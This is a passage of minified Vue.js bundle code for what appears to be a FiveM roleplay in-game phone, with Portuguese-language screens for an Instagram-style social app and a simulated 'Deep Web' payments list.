            onClick: t[3] || (t[3] = e => l.addImage()),
            class: "bg-tor p-2"
        }, "Clique para adicionar")), Pl("div", Yb, [Pl("button", {
            onClick: t[4] || (t[4] = e => l.publish()),
            class: "bg-tor p-2"
        }, "Publicar")])])])),
        _: 1
    })
}));
Hb.render = Zb, Hb.__scopeId = "data-v-a969c978";
const Qb = {
        components: {
            Page: Lh
        },
        setup() {
            const e = rt([]);
            return _o.backend.tor_payments().then((t => {
                t.forEach((e => {
                    e.sending = e.sender == zh.id
                })), e.value = t
            })), {
                state: zh,
                payments: e
            }
        }
    },
    eg = Il(" Deep Web "),
    tg = {
        class: "p-4"
    },
    ng = {
        class: "break-words"
    },
    lg = {
        key: 0
    },
    ag = {
        key: 1
    };
Qb.render = function(e, t, n, l, a, s) {
    const o = dl("Page");
    return wl(), _l(o, null, {
        header: en((() => [eg])),
        default: en((() => [Pl("ul", tg, [(wl(!0), _l(bl, null, fa(l.payments, (t => (wl(), _l("li", {
            key: t.id,
            class: ["flex items-start text-white text-xl mb-4", [t.sending ? "flex-row-reverse" : ""]]
        }, [Pl("img", {
            class: "w-14 h-14 rounded-full bg-white",
            src: `https://avatars.dicebear.com/api/identicon/${t.sending?t.target:t.sender}.svg`,
            alt: ""
        }, null, 8, ["src"]), Pl("div", {
            class: ["rounded flex-1 p-3", [t.sending ? "bg-tor mr-4" : "bg-gray-800 ml-4"]]
        }, [Pl("h1", ng, [t.sending ? (wl(), _l("span", lg, "Você enviou " + g(e.$filters.intToMoney(t.amount)) + " para @" + g(t.target), 1)) : (wl(), _l("span", ag, "Você recebeu " + g(e.$filters.intToMoney(t.amount)) + " de @" + g(t.sender), 1))])], 2)], 2)))), 128))])])),
        _: 1
    })
};
const sg = {
    profile: Ze(_o.localhost ? {
        id: 1,
        username: "jesteriruka",
        bio: "aaaaaaaaaaaaaaaaaaa",
        verified: 1,
        avatarURL: "http://fivem.jesteriruka.dev/storage/JesterIruka/0af557b7-83c5-4c8d-894e-30a0d224df21.jpg"
    } : {}),
    stories: rt([]),
    storiesSeen: {},
    addStory(e) {
        this.stories.value.push(e), delete this.storiesSeen[e.author.username], this.sortStory()
    },
    remStory(e) {
        const t = this.stories.value,
            n = t.find((t => t.id == e));
        n && (t.splice(t.indexOf(n), 1), delete this.storiesSeen[n.author.username], this.sortStory())
    },
    showProfileMap(e) {
        bo().clearAndRequest(Object.entries(e).map((([e, t]) => ({
            key: e,
            html: `\n      <div class="flex items-center">\n        <div class="w-16 h-16 bg-instagram rounded-full">\n          <img class="w-16 h-16 p-0.5 rounded-full" src="${zs(t)}">\n        </div>\n        <span class="ml-5">${zs(e)}</span>\n      </div>`
        }))), 50).then((e => e && kO.push("/instagram/profiles/" + e)))
    },
    getStoryMap() {
        const e = {};
        for (let t of this.stories.value) {
            const n = t.author.username;
            n in e ? e[n].push(t) : e[n] = [t]
        }
        for (let t in e) e[t].seen = !!this.storiesSeen[t];
        return e
    },
    markAsSeen(e) {
        this.storiesSeen[e] = !0, this.sortStory()
    },
    sortStory() {
        this.stories.value.sort(((e, t) => {
            const n = this.storiesSeen[e.author.username],
                l = this.storiesSeen[t.author.username];
            return e.author.username == t.author.username ? 0 : e.author.username == this.profile.username ? -1 : t.author.username == this.profile.username ? 1 : n != l ? n ? 1 : -1 : e.author.username.localeCompare(t.author.username)
        }))
    },
    async loadStories() {
        this.stories.value = await _o.backend.ig_getStories(), this.sortStory()
    }
};
_o.pusher.on("REFRESH", (() => {
    sg.profile = {}
})), _o.pusher.on("INSTAGRAM_STORY", (e => {
    sg.addStory(e)
})), _o.pusher.on("INSTAGRAM_DELETE_STORY", (e => {
    sg.remStory(e)
}));
const og = {
        props: ["back"],
        setup() {
            const e = Qi(),
                t = rt(_o.hasNotificationFor("instagram"));
            Rn(t, (e => _o.setNotificationFor("instagram", e)));
            const n = _o.settings.instagramLogo;
            return {
                dark: _o.darkTheme,
                notifications: t,
                logo: n,
                logout: function() {
                    for (let e in sg.profile) delete sg.profile[e];
                    _o.backend.ig_logout(), e.replace("/instagram/login")
                }
            }
        }
    },
    rg = {
        class: "h-32 pt-16 border-b border-theme bg-theme text-theme text-left flex-shrink-0"
    },
    ig = Pl("i", {
        class: "far fa-sign-out"
    }, null, -1);
og.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", rg, [Pl("img", {
        src: l.logo,
        class: "h-14 ml-6",
        style: {
            filter: l.dark ? "invert(1)" : ""
        }
    }, null, 12, ["src"]), Pl("button", {
        class: "absolute top-16 right-20",
        onClick: t[1] || (t[1] = e => l.logout())
    }, [ig]), Pl("button", {
        class: "absolute top-16 right-4",
        onClick: t[2] || (t[2] = e => l.notifications = !l.notifications)
    }, [Pl("i", {
        class: ["far", l.notifications ? "fa-bell" : "fa-bell-slash", "w-12"]
    }, null, 2)])])
};
const cg = {
        setup() {
            io();
            const e = Qi();
            return {
                profile: sg.profile,
                createPost: async function() {
                    try {
                        const t = await _o.useAnyImage("/instagram");
                        setTimeout((() => e.replace({
                            path: "/instagram/create",
                            query: {
                                url: t
                            }
                        })), 200)
                    } catch (t) {}
                }
            }
        }
    },
    ug = Pl("div", {
        class: "w-full h-28"
    }, null, -1),
    dg = {
        class: "absolute bottom-0 w-full h-28 bg-theme text-theme border-t border-theme px-2 grid grid-cols-5"
    },
    pg = Pl("i", {
        class: "fal fa-home-alt text-3xl"
    }, null, -1),
    fg = {
        key: 0,
        class: "mx-auto w-1 h-1 bg-theme2 rounded-full"
    },
    mg = Pl("i", {
        class: "fal fa-search text-3xl"
    }, null, -1),
    hg = {
        key: 0,
        class: "mx-auto w-1 h-1 bg-theme2 rounded-full"
    },
    bg = Pl("i", {
        class: "fal fa-plus-square text-3xl"
    }, null, -1),
    gg = {
        key: 0,
        class: "mx-auto w-1 h-1 bg-theme2 rounded-full"
    },
    vg = Pl("i", {
        class: "fal fa-heart text-3xl"
    }, null, -1),
    xg = {
        key: 0,
        class: "mx-auto w-1 h-1 bg-theme2 rounded-full"
    };
cg.render = function(e, t, n, l, a, s) {
    var o;
    return wl(), _l(bl, null, [ug, Pl("div", dg, [Pl("button", {
        onClick: t[1] || (t[1] = t => e.$router.replace("/instagram"))
    }, [pg, "/instagram" === e.$route.path ? (wl(), _l("div", fg)) : Ml("", !0)]), Pl("button", {
        onClick: t[2] || (t[2] = t => e.$router.replace("/instagram/search"))
    }, [mg, "/instagram/search" === e.$route.path ? (wl(), _l("div", hg)) : Ml("", !0)]), Pl("button", {
        onClick: t[3] || (t[3] = (...e) => l.createPost && l.createPost(...e))
    }, [bg, "/instagram/create" === e.$route.path ? (wl(), _l("div", gg)) : Ml("", !0)]), Pl("button", {
        onClick: t[4] || (t[4] = t => e.$router.replace("/instagram/notifications"))
    }, [vg, "/instagram/notifications" === e.$route.path ? (wl(), _l("div", xg)) : Ml("", !0)]), Pl("button", {
        onClick: t[5] || (t[5] = t => e.$router.replace("/instagram/profiles/" + l.profile.username)),
        class: "mx-auto"
    }, [Pl("img", {
        class: "rounded-full h-12 w-12",
        src: null == (o = l.profile) ? void 0 : o.avatarURL
    }, null, 8, ["src"])])])], 64)
};
const yg = {
        components: {
            Header: og,
            Bottom: cg
        },
        setup() {
            const e = ec(),
                t = Qi(),
                n = rt(!1),
                l = rt(e.query.url),
                a = rt("");
            return {
                selfie: n,
                image: l,
                content: a,
                publish: function() {
                    _o.backend.ig_createPost(l.value, a.value, !1).then((() => {
                        t.replace("/instagram")
                    }))
                }
            }
        }
    },
    kg = {
        class: "bg-theme text-theme h-full p-5"
    },
    wg = {
        key: 0
    },
    Cg = {
        class: "mt-3"
    },
    _g = Pl("label", null, "Status", -1),
    Ag = {
        class: "mt-3"
    };
yg.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("app-input"),
        i = dl("Bottom");
    return wl(), _l(bl, null, [Pl(o), Pl("div", kg, [l.image ? (wl(), _l("div", wg, [Pl("img", {
        class: "max-h-96 rounded-xl mx-auto",
        src: l.image
    }, null, 8, ["src"]), Pl("div", Cg, [_g, Pl(r, {
        class: "bg-theme border-theme",
        placeholder: "Como você está se sentindo?",
        modelValue: l.content,
        "onUpdate:modelValue": t[1] || (t[1] = e => l.content = e),
        maxlength: "240"
    }, null, 8, ["modelValue"])]), Pl("div", Ag, [Pl("button", {
        onClick: t[2] || (t[2] = (...e) => l.publish && l.publish(...e)),
        class: "mt-5 bg-blue-500 p-3 text-white w-full rounded-xl"
    }, " Publicar ")])])) : Ml("", !0)]), Pl(i)], 64)
};
const Sg = {
        props: ["post"],
        setup(e) {
            const t = e.post,
                n = rt(""),
                {
                    profile: l
                } = sg,
                a = ec(),
                s = Qi(),
                o = jl("useImageFocus"),
                r = a.path.endsWith("/posts/" + t.id),
                i = da((() => sg.stories.value.some((e => e.author.username == t.author.username))));

            function c() {
                c.lastLike > Date.now() || (c.lastLike = Date.now() + 667, _o.backend.ig_setLike(t.id, !t.likes.includes(l.id)))
            }
            return c.lastLike = 0, r ? (Rn(t.comments, (() => Lt((() => {
                const e = document.querySelector("ul[comments]");
                n.value || e.scrollTo(0, 9e6)
            })))), _o.onceRoute("INSTAGRAM_LIKE", (({
                post_id: e,
                profile_id: n,
                toggle: l
            }) => {
                e == t.id && (l ? t.likes.push(n) : t.likes = t.likes.filter((e => e != n)))
            })), _o.onceRoute("INSTAGRAM_REPLY", (e => {
                t.id == e.post_id && t.comments.push(e)
            }))) : (_o.onceRoute("INSTAGRAM_LIKE", (({
                post_id: e,
                profile_id: n,
                toggle: l
            }) => {
                e == t.id && (l ? t.likes.push(n) : t.likes = t.likes.filter((e => e != n)))
            })), _o.onceRoute("INSTAGRAM_REPLY", (({
                post_id: e
            }) => {
                e == t.id && (t.comments += 1)
            }))), {
                profile: l,
                hasStory: i,
                comment: n,
                reply: function() {
                    var e;
                    (null == (e = n.value) ? void 0 : e.trim()) && (_o.backend.ig_reply(t.id, n.value), n.value = "")
                },
                like: c,
                showOptions: async function() {
                    const e = {};
                    if ((t.profile_id == l.id || _o.identity.moderator) && (e.delete = "Excluir publicação"), t.profile_id != l.id) {
                        !_o.localhost && await _o.backend.ig_isFollowing(t.profile_id) ? e.unfollow = "Deixar de seguir" : e.follow = "Seguir"
                    }
                    t.likes.includes(l.id) ? e.dislike = "Descurtir" : e.like = "Curtir", e.likes = "Ver curtidas", bo().request(e, 33).then((e => {
                        switch (e) {
                            case "delete":
                                _o.backend.ig_deletePost(t.id);
                                break;
                            case "likes":
                                _o.backend.ig_getLikes(t.id).then((e => sg.showProfileMap(e)));
                                break;
                            case "like":
                                _o.backend.ig_setLike(t.id, !0);
                                break;
                            case "dislike":
                                _o.backend.ig_setLike(t.id, !1);
                                break;
                            case "follow":
                                _o.backend.ig_setFollow(t.profile_id, !0);
                                break;
                            case "unfollow":
                                _o.backend.ig_setFollow(t.profile_id, !1)
                        }
                    }))
                },
                handleImageClick: function() {
                    r ? o(t.image) : s.push("/instagram/posts/" + t.id)
                }
            }
        }
    },
    Rg = sn("data-v-1e9271c0");
ln("data-v-1e9271c0");
const Tg = {
        class: "flex flex-col border-b border-theme flex-1"
    },
    Eg = {
        class: "flex items-center p-3"
    },
    Pg = Pl("i", {
        class: "far fa-ellipsis-v"
    }, null, -1),
    Lg = {
        class: "p-3 flex items-center"
    },
    Ig = {
        key: 0,
        class: "far fa-heart"
    },
    Og = {
        key: 1,
        class: "fas fa-heart text-red-500"
    },
    Mg = Pl("i", {
        class: "far fa-comment",
        style: {
            transform: "rotateY(180deg)"
        }
    }, null, -1),
    Vg = {
        key: 0,
        class: "ml-3"
    },
    Dg = {
        key: 1,
        class: "ml-3"
    },
    Ug = {
        class: "text-gray-500 text-xl ml-auto"
    },
    Ng = {
        key: 0,
        style: {
            flex: "1 0 0"
        },
        comments: "",
        class: "overflow-y-auto hide-scroll border-t border-theme p-3"
    },
    $g = {
        key: 0,
        class: "mb-3"
    },
    jg = {
        class: "mr-3"
    },
    Fg = {
        class: "font-light text-3xl break-words"
    },
    zg = {
        class: "mr-3"
    },
    Bg = {
        class: "font-light text-3xl break-words"
    },
    Hg = {
        key: 1,
        style: {
            flex: "1 0 0"
        },
        class: "p-3"
    },
    qg = {
        class: "mr-3"
    },
    Gg = {
        class: "text-3xl break-words"
    },
    Wg = {
        key: 2,
        class: "border-t border-theme flex px-4 p-5 mb-3 flex-shrink-0"
    };
an();
const Kg = Rg(((e, t, n, l, a, s) => {
    var o, r;
    const i = dl("app-verified");
    return wl(), _l("div", Tg, [Pl("div", Eg, [Pl("div", {
        class: ["h-20 w-20 rounded-full", {
            "bg-instagram": l.hasStory
        }]
    }, [Pl("img", {
        class: "h-20 w-20 rounded-full p-0.5",
        src: n.post.author.avatarURL,
        alt: ""
    }, null, 8, ["src"])], 2), Pl("h3", {
        class: "ml-5",
        onClick: t[1] || (t[1] = t => e.$router.replace("/instagram/profiles/" + n.post.author.username))
    }, g(null != (o = n.post.author.name) ? o : n.post.author.username), 1), (null == (r = n.post.author) ? void 0 : r.verified) ? (wl(), _l(i, {
        key: 0,
        class: "ml-3 w-8 h-8"
    })) : Ml("", !0), Pl("button", {
        class: "ml-auto text-theme px-6 py-3",
        onClick: t[2] || (t[2] = e => l.showOptions())
    }, [Pg])]), Pl("img", {
        style: {
            "max-height": "32rem"
        },
        class: "block w-auto mx-auto",
        onClick: t[3] || (t[3] = (...e) => l.handleImageClick && l.handleImageClick(...e)),
        loading: "lazy",
        src: n.post.image,
        alt: ""
    }, null, 8, ["src"]), Pl("div", Lg, [Pl("button", {
        onClick: t[4] || (t[4] = e => l.like(n.post.id))
    }, [n.post.likes.includes(l.profile.id) ? (wl(), _l("i", Og)) : (wl(), _l("i", Ig)), Il(" " + g(n.post.likes.length.toLocaleString("pt-BR")), 1)]), Pl("button", {
        class: "ml-5",
        onClick: t[5] || (t[5] = t => e.$router.push("/instagram/posts/" + n.post.id))
    }, [Mg, Array.isArray(n.post.comments) ? (wl(), _l("span", Vg, g(n.post.comments.length.toLocaleString("pt-BR")), 1)) : (wl(), _l("span", Dg, g(n.post.comments.toLocaleString("pt-BR")), 1))]), Pl("span", Ug, g(e.$filters.unixToDayOfMonth(n.post.created_at)), 1)]), Array.isArray(n.post.comments) ? (wl(), _l("ul", Ng, [n.post.content ? (wl(), _l("li", $g, [Pl("b", jg, g(n.post.author.username), 1), Pl("span", Fg, g(n.post.content), 1)])) : Ml("", !0), (wl(!0), _l(bl, null, fa(n.post.comments, ((e, t) => (wl(), _l("li", {
        key: t
    }, [Pl("b", zg, g(e.author.username), 1), Pl("span", Bg, g(e.content), 1)])))), 128))])) : n.post.content ? (wl(), _l("div", Hg, [Pl("b", qg, g(n.post.author.username), 1), Pl("span", Gg, g(n.post.content), 1)])) : Ml("", !0), Array.isArray(n.post.comments) ? (wl(), _l("div", Wg, [Zn(Pl("input", {
        type: "text",
        maxlength: "255",
        class: "w-full bg-theme pr-5",
        "onUpdate:modelValue": t[6] || (t[6] = e => l.comment = e),
        onKeydown: t[7] || (t[7] = us(((...e) => l.reply && l.reply(...e)), ["enter"])),
        placeholder: "Adicione um comentário"
    }, null, 544), [
        [ns, l.comment]
    ]), Pl("button", {
        class: [l.comment ? "text-blue-500" : "text-blue-200"],
        onClick: t[8] || (t[8] = (...e) => l.reply && l.reply(...e))
    }, "Post", 2)])) : Ml("", !0)])
}));
Sg.render = Kg, Sg.__scopeId = "data-v-1e9271c0";
const Jg = {
        setup() {
            const e = Qi(),
                t = ec(),
                n = rt(0),
                l = rt(t.params.id),
                a = da((() => sg.stories.value.filter((e => e.author.username == l.value)))),
                s = da((() => a.value[n.value])),
                o = sg.stories.value.map((e => e.author.username)).filter(Hs),
                r = da((() => l.value === sg.profile.username || _o.identity.moderator));

            function i(e) {
                n.value = 0, l.value = e, a.effect()
            }

            function c() {
                const t = o.indexOf(l.value) + 1;
                sg.markAsSeen(l.value), t < o.length ? i(o[t]) : e.back()
            }
            return Rn(l, (t => e.replace("/instagram/stories/" + t))), {
                index: n,
                stories: a,
                current: s,
                next: function(e = 1) {
                    if (e < 0) return function() {
                        if (0 == n.value) {
                            const e = o.indexOf(l.value) - 1; - 1 != e && i(o[e])
                        } else n.value -= 1
                    }();
                    n.value + 1 >= a.value.length ? c() : n.value += 1
                },
                destroy: async function() {
                    var e;
                    const t = n.value,
                        l = a.value.length,
                        s = null == (e = a.value) ? void 0 : e[t];
                    s && _o.backend.ig_deleteStory(s.id).then((() => {
                        (1 == l || t >= l - 1) && c()
                    }))
                },
                canDestroy: r
            }
        }
    },
    Xg = sn("data-v-5e4237d2");
ln("data-v-5e4237d2");
const Yg = {
        class: "absolute inset-0 pt-16 h-32 w-full bg-theme z-1 text-center"
    },
    Zg = Pl("i", {
        class: "fas fa-chevron-left text-blue-400"
    }, null, -1),
    Qg = {
        class: "text-theme"
    },
    ev = Pl("i", {
        class: "far fa-trash-alt text-red-500"
    }, null, -1),
    tv = {
        key: 2,
        class: "absolute break-words bottom-48 p-2 left-2 right-2 rounded-2xl text-center text-white bg-black bg-opacity-50"
    },
    nv = {
        class: "absolute bottom-8 w-full flex justify-center"
    },
    lv = {
        key: 0,
        class: "w-4 h-4 rounded-full bg-gray-200"
    },
    av = {
        key: 1,
        class: "w-4 h-4 rounded-full border bg-gray-600"
    };
an();
const sv = Xg(((e, t, n, l, a, s) => {
    var o, r, i;
    const c = dl("app-verified");
    return wl(), _l("div", {
        class: "bg-theme p-2 h-full flex flex-col justify-center",
        key: e.$route.params.id
    }, [Pl("div", Yg, [Pl("button", {
        onClick: t[1] || (t[1] = t => e.$router.back()),
        class: "absolute top-16 left-0 px-5"
    }, [Zg]), Pl("span", Qg, [Il(g(e.$route.params.id.substr(0, 16)) + " ", 1), (null == (o = l.stories[l.index]) ? void 0 : o.author.verified) ? (wl(), _l(c, {
        key: 0,
        class: "inline w-8 h-8"
    })) : Ml("", !0)]), l.canDestroy ? (wl(), _l("button", {
        key: 0,
        onClick: t[2] || (t[2] = (...e) => l.destroy && l.destroy(...e)),
        class: "absolute top-16 right-0 px-5"
    }, [ev])) : Ml("", !0)]), Pl("div", {
        class: "absolute top-32 -left-2 -right-2 -bottom-2",
        style: {
            background: "black",
            backgroundImage: "url(" + l.current.image + ")",
            backgroundSize: "100% 100%",
            filter: "blur(5px)"
        }
    }, null, 4), l.current.video ? (wl(), _l("video", {
        key: 0,
        onEnded: t[3] || (t[3] = e => l.next()),
        src: l.current.video,
        class: "absolute left-0 right-0 w-full",
        autoplay: "",
        controls: ""
    }, null, 40, ["src"])) : (wl(), _l("img", {
        key: 1,
        class: "absolute left-0 right-0 w-full",
        src: l.current.image
    }, null, 8, ["src"])), Pl("button", {
        class: "absolute left-0 h-1/3 w-5/12",
        onClick: t[4] || (t[4] = e => l.next(-1))
    }), Pl("button", {
        class: "absolute right-0 h-1/3 w-5/12",
        onClick: t[5] || (t[5] = e => l.next())
    }), (null == (r = l.stories[l.index]) ? void 0 : r.content) ? (wl(), _l("h1", tv, g(null == (i = l.stories[l.index]) ? void 0 : i.content), 1)) : Ml("", !0), Pl("div", nv, [(wl(!0), _l(bl, null, fa(l.stories, ((e, t) => (wl(), _l("div", {
        key: t,
        class: "mr-2 last:mr-0"
    }, [t == l.index ? (wl(), _l("div", lv)) : (wl(), _l("div", av))])))), 128))])])
}));
Jg.render = sv, Jg.__scopeId = "data-v-5e4237d2";
const ov = {
        components: {
            Header: og,
            NavBar: cg,
            AddPost: yg,
            Post: Sg,
            Story: Jg
        },
        setup() {
            jl("setDark")();
            const e = jl("prompt"),
                t = jl("videoCamera"),
                n = Ze([]),
                {
                    profile: l
                } = sg,
                a = io(),
                s = da((() => sg.getStoryMap())),
                o = rt(_o.hasNotificationFor("instagram"));
            return Rn(o, (e => _o.setNotificationFor("instagram", e))), _o.backend.ig_getTimeline().then((e => {
                n.length = 0, Object.assign(n, e)
            })), _o.onceRoute("INSTAGRAM_POST", (e => {
                n.unshift(e) > 100 && (n.length = 100)
            })), _o.onceRoute("INSTAGRAM_DESTROY", (e => {
                const t = n.findIndex((t => t.id == e)); - 1 != t && n.splice(t, 1)
            })), _o.localhost && n.push({
                id: 1,
                author: {
                    username: "jesteriruka",
                    verified: 1
                },
                content: "Hello world",
                image: "",
                likes: [],
                comments: 0,
                created_at: Date.now() / 1e3
            }), _o.pusher.removeAllListeners("INSTAGRAM_LIKE"), _o.pusher.removeAllListeners("INSTAGRAM_REPLY"), {
                dark: _o.storage.darkTheme,
                notifications: o,
                profile: l,
                stories: s,
                posts: n,
                createStory: async function() {
                    try {
                        const n = await bo().request([
                            ["Vídeo", "self-center"],
                            ["Câmera", "self-center"],
                            ["Galeria", "self-center"], _o.settings.allowUnsafeURL && ["Imagem", "self-center"]
                        ], 25, !0);
                        let l, s = "";
                        0 == n ? ([l, thumbnail] = await t(), s = await eo.upload(thumbnail, "jpg")) : s = 1 == n ? await a.request(!1, "/instagram") : 2 == n ? await po() : await _o.promptImageURL();
                        const o = await e("Status");
                        _o.backend.ig_createStory(s, o, l)
                    } catch (n) {}
                }
            }
        }
    },
    rv = {
        class: "flex flex-col h-full"
    },
    iv = {
        class: "flex-1 overflow-y-auto hide-scroll bg-theme text-theme"
    },
    cv = {
        class: "h-44 px-2 flex items-center border-b border-theme shadow overflow-x-auto fancy-scroll"
    },
    uv = {
        key: 0,
        class: "flex-shrink-0"
    },
    dv = {
        class: "flex flex-center rounded-full relative"
    },
    pv = Pl("i", {
        class: "fas fa-plus text-base text-white"
    }, null, -1),
    fv = Pl("h1", {
        class: "text-lg text-center"
    }, "Seu story", -1),
    mv = Pl("i", {
        class: "fas fa-plus text-base text-white"
    }, null, -1),
    hv = {
        class: "w-28 overflow-x-hidden text-lg text-center"
    };
ov.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("Post"),
        i = dl("NavBar");
    return wl(), _l("div", rv, [Pl(o), Pl("div", iv, [Pl("ul", cv, [l.stories[l.profile.username] ? Ml("", !0) : (wl(), _l("li", uv, [Pl("div", dv, [Pl("img", {
        class: "w-28 h-28 p-1 rounded-full",
        src: l.profile.avatarURL
    }, null, 8, ["src"]), Pl("button", {
        onClick: t[1] || (t[1] = is(((...e) => l.createStory && l.createStory(...e)), ["stop"])),
        class: [l.dark ? "border-black" : "border-white", "absolute bottom-1 right-1 border-2 bg-lightBlue-600 w-8 h-8 rounded-full text-white flex flex-center"]
    }, [pv], 2)]), fv])), (wl(!0), _l(bl, null, fa(l.stories, ((n, a) => (wl(), _l("li", {
        class: "ml-1 last:pr-1 flex-shrink-0",
        key: a
    }, [Pl("div", {
        class: ["w-28 flex flex-center rounded-full relative", {
            "bg-instagram": !n.seen || l.profile.username == a
        }],
        onClick: t => e.$router.push("/instagram/stories/" + a)
    }, [Pl("img", {
        class: "w-28 h-28 p-1 rounded-full",
        src: n[0].image
    }, null, 8, ["src"]), l.profile.username == a ? (wl(), _l("button", {
        key: 0,
        class: [l.dark ? "border-black" : "border-white", "absolute bottom-1 right-1 border-2 bg-lightBlue-600 w-8 h-8 rounded-full text-white flex flex-center"],
        onClick: t[2] || (t[2] = is(((...e) => l.createStory && l.createStory(...e)), ["stop"]))
    }, [mv], 2)) : Ml("", !0)], 10, ["onClick"]), Pl("h1", hv, g(l.profile.username == a ? "Seu story" : a), 1)])))), 128))]), Pl("ul", null, [(wl(!0), _l(bl, null, fa(l.posts, (e => (wl(), _l("li", {
        postid: e.id,
        key: e.id
    }, [Pl(r, {
        post: e
    }, null, 8, ["post"])], 8, ["postid"])))), 128))])]), Pl(i)])
};
const bv = {
        setup() {
            jl("setDark")();
            const e = rt(!0),
                t = rt(1),
                n = rt([]),
                l = _o.settings.instagramLogo;
            return _o.backend.ig_accounts().then((async l => {
                n.value = l, t.value = await _o.backend.ig_max_accounts(), e.value = !1
            })), sg.profile.id && kO.replace("/instagram"), {
                dark: _o.storage.darkTheme,
                logo: l,
                max: t,
                accounts: n,
                login: async function(e) {
                    const t = await _o.backend.ig_login(e);
                    t && (Object.assign(sg.profile, t), sg.loadStories(), kO.replace("/instagram"))
                },
                isLoading: e
            }
        }
    },
    gv = {
        key: 0,
        class: "h-full bg-theme"
    },
    vv = {
        key: 1,
        class: "flex flex-col h-full bg-theme text-theme p-5 pt-24"
    },
    xv = {
        class: "mb-8"
    },
    yv = {
        class: "w-3/4 mx-auto"
    },
    kv = {
        class: "ml-2 flex flex-col"
    },
    wv = {
        class: "text-2xl"
    },
    Cv = {
        class: "text-xl"
    };
bv.render = function(e, t, n, l, a, s) {
    return l.isLoading ? (wl(), _l("div", gv)) : (wl(), _l("div", vv, [Pl("div", xv, [Pl("img", {
        class: "h-16 mx-auto",
        src: l.logo,
        style: {
            filter: "invert(" + (l.dark ? 1 : 0) + ")"
        }
    }, null, 12, ["src"])]), Pl("ul", yv, [(wl(!0), _l(bl, null, fa(l.accounts, (e => {
        var t;
        return wl(), _l("li", {
            class: "flex items-center mb-5",
            key: e.id
        }, [Pl("img", {
            class: "w-24 h-24 rounded-lg",
            src: e.avatarURL
        }, null, 8, ["src"]), Pl("div", kv, [Pl("h1", wv, g(null != (t = e.name) ? t : e.username), 1), Pl("h3", Cv, "@" + g(e.username), 1)]), Pl("button", {
            onClick: t => l.login(e.id),
            class: "ml-auto bg-blue-500 rounded-xl text-white text-lg p-2 px-4"
        }, "Login", 8, ["onClick"])])
    })), 128))]), l.max > l.accounts.length ? (wl(), _l("div", {
        key: 0,
        class: ["text-center", {
            "my-auto": !l.accounts.length
        }]
    }, [Pl("button", {
        onClick: t[1] || (t[1] = t => e.$router.replace("/instagram/register")),
        class: "w-2/3 text-center bg-blue-500 rounded-xl text-white text-2xl p-2"
    }, "Criar uma conta")], 2)) : Ml("", !0)]))
};
const _v = {
        setup() {
            jl("setDark")();
            const e = jl("alert");
            io();
            const t = _o.settings.instagramLogo,
                n = rt(""),
                l = rt(""),
                a = rt(""),
                s = rt("");
            return {
                dark: _o.storage.darkTheme,
                avatarURL: n,
                name: l,
                username: a,
                bio: s,
                takeSelfie: async function() {
                    try {
                        const e = await _o.useAnyImage("/instagram", !0);
                        n.value = e
                    } catch (e) {}
                },
                createAccount: function() {
                    var t;
                    if (["register", "search", "create", "liked", "stories"].includes(null == (t = a.value) ? void 0 : t.toLowerCase())) return e("Este nome não pode ser utilizado");
                    n.value ? _o.backend.ig_register(l.value, a.value, s.value, n.value).then((t => {
                        t.error ? e(t.error) : kO.replace("/instagram/login")
                    })) : e("A selfie é obrigatória!")
                },
                logo: t
            }
        }
    },
    Av = {
        class: "flex flex-col h-full bg-theme text-theme p-5 pt-24"
    },
    Sv = {
        class: "mb-8"
    },
    Rv = {
        class: "w-64 h-64 bg-instagram mx-auto rounded-full"
    },
    Tv = Pl("span", {
        class: "text-center text-gray-500 text-xl mt-2"
    }, "Clique na imagem para alterar", -1),
    Ev = {
        key: 0
    },
    Pv = {
        class: "mt-3"
    },
    Lv = Pl("label", null, "Nome", -1),
    Iv = {
        class: "mt-3"
    },
    Ov = Pl("label", null, "Usuário", -1),
    Mv = {
        class: "mt-3"
    },
    Vv = Pl("label", null, "Biografia", -1),
    Dv = {
        class: "mt-3"
    };
_v.render = function(e, t, n, l, a, s) {
    const o = dl("app-input");
    return wl(), _l("div", Av, [Pl("div", Sv, [Pl("img", {
        class: "h-16 mx-auto",
        src: l.logo,
        style: {
            filter: "invert(" + (l.dark ? 1 : 0) + ")"
        }
    }, null, 12, ["src"])]), Pl("div", Rv, [Pl("img", {
        onClick: t[1] || (t[1] = (...e) => l.takeSelfie && l.takeSelfie(...e)),
        class: "rounded-full w-64 h-64 p-1",
        src: l.avatarURL || e.$asset("stock/user.jpg")
    }, null, 8, ["src"])]), Tv, l.avatarURL ? (wl(), _l("div", Ev, [Pl("div", Pv, [Lv, Pl(o, {
        maxlength: "32",
        modelValue: l.name,
        "onUpdate:modelValue": t[2] || (t[2] = e => l.name = e),
        class: "text-3xl bg-theme border-theme"
    }, null, 8, ["modelValue"])]), Pl("div", Iv, [Ov, Pl(o, {
        maxlength: "24",
        modelValue: l.username,
        "onUpdate:modelValue": t[3] || (t[3] = e => l.username = e),
        class: "text-3xl bg-theme border-theme"
    }, null, 8, ["modelValue"])]), Pl("div", Mv, [Vv, Pl(o, {
        maxlength: "255",
        modelValue: l.bio,
        "onUpdate:modelValue": t[4] || (t[4] = e => l.bio = e),
        class: "text-3xl bg-theme border-theme"
    }, null, 8, ["modelValue"])]), Pl("div", Dv, [Pl("button", {
        onClick: t[5] || (t[5] = (...e) => l.createAccount && l.createAccount(...e)),
        class: "w-full text-center bg-blue-500 rounded-xl text-white p-3"
    }, "Cadastre-se")])])) : Ml("", !0)])
};
const Uv = {
        components: {
            Header: og,
            NavBar: cg
        },
        setup() {
            const e = rt(""),
                t = rt([]);
            let n = null;

            function l() {
                _o.backend.ig_search(e.value).then((e => {
                    t.value = e.length && e
                }))
            }
            return Rn(e, (e => {
                if (!e) return t.value = [];
                clearTimeout(n), n = setTimeout(l, 500)
            })), {
                query: e,
                profiles: t
            }
        }
    },
    Nv = {
        class: "h-full flex flex-col bg-theme text-theme"
    },
    $v = {
        class: "p-3"
    },
    jv = {
        class: "relative"
    },
    Fv = Pl("i", {
        class: "fal fa-search absolute inset-y-5 left-4 text-gray-400 text-lg"
    }, null, -1),
    zv = {
        key: 0,
        class: "p-3"
    },
    Bv = {
        key: 1,
        class: "flex-1 overflow-y-auto hide-scroll p-3"
    },
    Hv = {
        class: "bg-instagram w-24 h-24 rounded-full mr-3"
    };
Uv.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("app-input"),
        i = dl("app-verified"),
        c = dl("nav-bar");
    return wl(), _l("div", Nv, [Pl(o), Pl("div", $v, [Pl("div", jv, [Fv, Pl(r, {
